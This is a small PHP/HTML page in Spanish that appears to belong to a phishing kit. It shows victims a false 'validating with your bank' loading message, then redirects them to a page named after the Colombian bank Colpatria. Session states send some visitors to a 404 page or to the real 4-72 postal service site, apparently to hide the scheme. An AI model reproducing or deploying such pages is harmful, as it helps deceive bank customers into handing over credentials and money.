<?php

session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Confirmando</title>
    
  <style>

*{
  margin: 0;
  padding: 0;
  font-family: Arial, Helvetica, sans-serif;
}
</style>

</head>
<body style="">


<center><div style="width: 90%;margin-top: 35%;">    
  
  <a style="font-size: 20px;">Espere un momento. <br> Estamos realizando unas validaciones con su banco</a><br>
   
  <img src="/assets/img/loader.gif" alt="" width="100%">
  <a style="font-size: 20px;">No tardará más de un minuto.</a></center>

</div>

<script>
    // Redirigir a otra página después de 5 segundos
setTimeout(function() {
  window.location.href = "./colpatria.php";
}, 10000);

</script>

</body>
</html>